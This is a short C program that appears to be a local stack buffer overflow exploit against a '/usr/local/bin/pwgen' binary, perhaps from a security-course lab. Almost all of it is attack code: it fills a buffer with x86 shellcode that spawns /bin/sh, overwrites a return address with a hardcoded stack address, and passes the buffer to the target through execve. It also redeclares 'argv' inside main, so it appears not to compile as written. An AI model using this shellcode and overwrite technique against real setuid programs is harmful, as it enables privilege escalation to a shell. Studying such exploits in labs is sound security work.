#include <shadow.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#define EXPLOIT "test"
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
#define CALCULATE_ADDR 984
#define SHELL_ADDR "\xdd\xdb\xbf\xff"

int main(int argc, char *argv[])
{
        // make the buffer 
        char buffer[1024];
        static char *argv[] = { NULL, NULL };
        static char *environ[] = {NULL};
        memset(buffer, 0x31, 1024); //setting of 1s into buffer
        //adding in the shellcode to the start of buffer
        memcpy(buffer, shellcode, 45);
        //now can override return addr
        memcpy(buffer+CALCULATE_ADDR, SHELL_ADDR, 4);

        argv[0] = buffer;
        execve("/usr/local/bin/pwgen", argv, environ);
        perror("execve");
        return 2;

}
